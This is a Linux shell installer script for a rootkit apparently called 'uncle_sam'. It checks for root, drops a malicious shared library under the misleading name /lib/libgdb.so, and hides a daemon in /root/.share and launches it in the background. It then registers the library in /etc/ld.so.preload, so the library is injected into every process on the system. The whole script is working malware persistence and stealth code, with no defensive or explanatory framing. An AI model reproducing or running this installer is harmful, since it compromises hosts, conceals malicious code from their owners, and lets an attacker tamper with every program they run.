#!/bin/sh
# Check if the script is running as root (EUID 0)

#cleanup function

if [ "$(id -u)" -ne 0 ]; then
    echo "Must be root to install"
    exit 1
fi

mkdir -p "/root/.share"
#create ld.so.preload file
cp ./libuncle_sam.so /lib/libgdb.so
cp ./uncle_sam_daemon /root/.share/
nohup /root/.share/uncle_sam_daemon &
touch /etc/ld.so.preload
chmod 755 /etc/ld.so.preload
nohup sh -c "sleep 2; echo `readlink -f /lib/libgdb.so` >> /etc/ld.so.preload" &
chmod 755 `readlink -f "/lib/libgdb.so"`